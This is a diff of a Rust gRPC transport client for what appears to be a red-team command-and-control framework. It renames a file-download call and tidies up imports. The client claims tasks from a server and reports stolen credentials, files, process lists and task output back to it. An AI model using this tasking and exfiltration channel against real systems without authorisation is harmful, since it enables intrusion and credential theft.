@@ -1,18 +1,18 @@
-use crate::pb::{
-    ClaimTasksRequest, ClaimTasksResponse, DownloadFileRequest, DownloadFileResponse,
-    ReportFileRequest, ReportFileResponse, ReportProcessListRequest, ReportProcessListResponse,
-    ReportTaskOutputRequest, ReportTaskOutputResponse,
-};
-use crate::pb::{ReportCredentialRequest, ReportCredentialResponse};
+use crate::Transport;
 use anyhow::Result;
-use async_trait::async_trait;
+use pb::c2::{
+    ClaimTasksRequest, ClaimTasksResponse, FetchAssetRequest, FetchAssetResponse,
+    ReportCredentialRequest, ReportCredentialResponse, ReportFileRequest, ReportFileResponse,
+    ReportProcessListRequest, ReportProcessListResponse, ReportTaskOutputRequest,
+    ReportTaskOutputResponse,
+};
 use std::sync::mpsc::{Receiver, Sender};
 use tonic::codec::ProstCodec;
 use tonic::GrpcMethod;
 use tonic::Request;
 
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
-static DOWNLOAD_FILE_PATH: &str = "/c2.C2/DownloadFile";
+static FETCH_ASSET_PATH: &str = "/c2.C2/DownloadFile";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
@@ -23,25 +23,21 @@ pub struct GRPC {
     grpc: tonic::client::Grpc<tonic::transport::Channel>,
 }
 
-#[async_trait]
-impl crate::Transport for GRPC {
-    async fn claim_tasks(
-        &mut self,
-        request: crate::pb::ClaimTasksRequest,
-    ) -> Result<crate::pb::ClaimTasksResponse> {
+impl Transport for GRPC {
+    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
         let resp = self.claim_tasks_impl(request).await?;
         Ok(resp.into_inner())
     }
 
-    async fn download_file(
+    async fn fetch_asset(
         &mut self,
-        request: crate::pb::DownloadFileRequest,
-        tx: Sender<crate::pb::DownloadFileResponse>,
+        request: FetchAssetRequest,
+        tx: Sender<FetchAssetResponse>,
     ) -> Result<()> {
         #[cfg(debug_assertions)]
         let filename = request.name.clone();
 
-        let resp = self.download_file_impl(request).await?;
+        let resp = self.fetch_asset_impl(request).await?;
         let mut stream = resp.into_inner();
         tokio::spawn(async move {
             loop {
@@ -79,16 +75,16 @@ impl crate::Transport for GRPC {
 
     async fn report_credential(
         &mut self,
-        request: crate::pb::ReportCredentialRequest,
-    ) -> Result<crate::pb::ReportCredentialResponse> {
+        request: ReportCredentialRequest,
+    ) -> Result<ReportCredentialResponse> {
         let resp = self.report_credential_impl(request).await?;
         Ok(resp.into_inner())
     }
 
     async fn report_file(
         &mut self,
-        request: Receiver<crate::pb::ReportFileRequest>,
-    ) -> Result<crate::pb::ReportFileResponse> {
+        request: Receiver<ReportFileRequest>,
+    ) -> Result<ReportFileResponse> {
         let stream = tokio_stream::iter(request);
         let tonic_req = Request::new(stream);
         let resp = self.report_file_impl(tonic_req).await?;
@@ -97,16 +93,16 @@ impl crate::Transport for GRPC {
 
     async fn report_process_list(
         &mut self,
-        request: crate::pb::ReportProcessListRequest,
-    ) -> Result<crate::pb::ReportProcessListResponse> {
+        request: ReportProcessListRequest,
+    ) -> Result<ReportProcessListResponse> {
         let resp = self.report_process_list_impl(request).await?;
         Ok(resp.into_inner())
     }
 
     async fn report_task_output(
         &mut self,
-        request: crate::pb::ReportTaskOutputRequest,
-    ) -> Result<crate::pb::ReportTaskOutputResponse> {
+        request: ReportTaskOutputRequest,
+    ) -> Result<ReportTaskOutputResponse> {
         let resp = self.report_task_output_impl(request).await?;
         Ok(resp.into_inner())
     }
@@ -124,7 +120,7 @@ impl GRPC {
     /// Contact the server for new tasks to execute.
     pub async fn claim_tasks_impl(
         &mut self,
-        request: impl tonic::IntoRequest<crate::pb::ClaimTasksRequest>,
+        request: impl tonic::IntoRequest<ClaimTasksRequest>,
     ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
             tonic::Status::new(
@@ -150,11 +146,11 @@ impl GRPC {
     ///   - "file-size": The number of bytes contained by the file.
     ///
     /// If no associated file can be found, a NotFound status error is returned.
-    pub async fn download_file_impl(
+    pub async fn fetch_asset_impl(
         &mut self,
-        request: impl tonic::IntoRequest<DownloadFileRequest>,
+        request: impl tonic::IntoRequest<FetchAssetRequest>,
     ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<DownloadFileResponse>>,
+        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
         tonic::Status,
     > {
         self.grpc.ready().await.map_err(|e| {
@@ -163,9 +159,9 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<DownloadFileRequest, DownloadFileResponse> =
+        let codec: ProstCodec<FetchAssetRequest, FetchAssetResponse> =
             tonic::codec::ProstCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(DOWNLOAD_FILE_PATH);
+        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
             .insert(GrpcMethod::new("c2.C2", "DownloadFile"));
@@ -176,7 +172,7 @@ impl GRPC {
     /// Report a credential.
     pub async fn report_credential_impl(
         &mut self,
-        request: impl tonic::IntoRequest<crate::pb::ReportCredentialRequest>,
+        request: impl tonic::IntoRequest<ReportCredentialRequest>,
     ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
             tonic::Status::new(
